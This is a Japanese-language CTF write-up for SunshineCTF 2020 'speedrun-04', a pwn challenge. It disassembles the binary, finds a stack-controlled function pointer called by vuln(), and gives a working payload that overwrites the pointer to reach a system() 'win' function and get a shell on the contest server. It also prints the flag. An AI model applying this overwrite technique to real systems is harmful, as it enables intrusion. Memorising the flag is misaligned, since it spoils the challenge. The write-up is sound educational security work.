# speedrun-04:Speedrun:10pts
nc chal.2020.sunshinectf.org 30004  
[chall_04](chall_04)  

# Solution
ファイルが配られる。  
```bash
$ file chall_04
chall_04: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6f9ee5d6303ac5ac90e75e26bbeb0c6d4ad88dc5, not stripped
$ ./chall_04
Like some kind of madness, was taking control.
AAAAA

Segmentation fault (コアダンプ)
```
怪しい挙動をしている。  
gdbで見てみる。  
```bash
$ gdb chall_04
~~~
gdb-peda$ disass main
Dump of assembler code for function main:
   0x00000000004005fb <+0>:     push   rbp
   0x00000000004005fc <+1>:     mov    rbp,rsp
   0x00000000004005ff <+4>:     sub    rsp,0x20
   0x0000000000400603 <+8>:     lea    rdi,[rip+0xb6]        # 0x4006c0
   0x000000000040060a <+15>:    call   0x4004a0 <puts@plt>
   0x000000000040060f <+20>:    mov    rdx,QWORD PTR [rip+0x200a2a]        # 0x601040 <stdin@@GLIBC_2.2.5>
   0x0000000000400616 <+27>:    lea    rax,[rbp-0x20]
   0x000000000040061a <+31>:    mov    esi,0x13
   0x000000000040061f <+36>:    mov    rdi,rax
   0x0000000000400622 <+39>:    call   0x4004c0 <fgets@plt>
   0x0000000000400627 <+44>:    call   0x4005ca <vuln>
   0x000000000040062c <+49>:    nop
   0x000000000040062d <+50>:    leave
   0x000000000040062e <+51>:    ret
End of assembler dump.
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   0x00000000004005ca <+0>:     push   rbp
   0x00000000004005cb <+1>:     mov    rbp,rsp
   0x00000000004005ce <+4>:     sub    rsp,0x240
   0x00000000004005d5 <+11>:    mov    rdx,QWORD PTR [rip+0x200a64]        # 0x601040 <stdin@@GLIBC_2.2.5>
   0x00000000004005dc <+18>:    lea    rax,[rbp-0x40]
   0x00000000004005e0 <+22>:    mov    esi,0x64
   0x00000000004005e5 <+27>:    mov    rdi,rax
   0x00000000004005e8 <+30>:    call   0x4004c0 <fgets@plt>
   0x00000000004005ed <+35>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004005f1 <+39>:    mov    eax,0x0
   0x00000000004005f6 <+44>:    call   rdx
   0x00000000004005f8 <+46>:    nop
   0x00000000004005f9 <+47>:    leave
   0x00000000004005fa <+48>:    ret
End of assembler dump.
gdb-peda$ q
```
mainからvulnが呼ばれており、`call   rdx`という仕様になっている。  
rdxを書き換え、任意の場所を呼び出せる。  
呼び出し先を探すとwinなる関数があった。  
```bash
$ objdump -D chall_04
~~~
00000000004005b0 <frame_dummy>:
  4005b0:       55                      push   %rbp
  4005b1:       48 89 e5                mov    %rsp,%rbp
  4005b4:       5d                      pop    %rbp
  4005b5:       eb 89                   jmp    400540 <register_tm_clones>

00000000004005b7 <win>:
  4005b7:       55                      push   %rbp
  4005b8:       48 89 e5                mov    %rsp,%rbp
  4005bb:       48 8d 3d f6 00 00 00    lea    0xf6(%rip),%rdi        # 4006b8 <_IO_stdin_used+0x8>
  4005c2:       e8 e9 fe ff ff          callq  4004b0 <system@plt>
  4005c7:       90                      nop
  4005c8:       5d                      pop    %rbp
  4005c9:       c3                      retq

00000000004005ca <vuln>:
  4005ca:       55                      push   %rbp
  4005cb:       48 89 e5                mov    %rsp,%rbp
  4005ce:       48 81 ec 40 02 00 00    sub    $0x240,%rsp
  4005d5:       48 8b 15 64 0a 20 00    mov    0x200a64(%rip),%rdx        # 601040 <stdin@@GLIBC_2.2.5>
~~~
```
gdbなどでパディングを調整し、以下のように0x4005b7に飛ばす。  
```bash
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb7\x05\x40\x00\x00\x00\x00\x00";cat) | ./chall_04
Like some kind of madness, was taking control.
ls
chall_04
^C
Segmentation fault (コアダンプ)
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb7\x05\x40\x00\x00\x00\x00\x00";cat) | nc chal.2020.sunshinectf.org 30004
Like some kind of madness, was taking control.
ls
chall_04
flag.txt
cat flag.txt
sun{critical-acclaim-96cfde3d068e77bf}
^C
```
シェルが得られるので、flag.txtを見るとflagが書かれていた。  

## sun{critical-acclaim-96cfde3d068e77bf}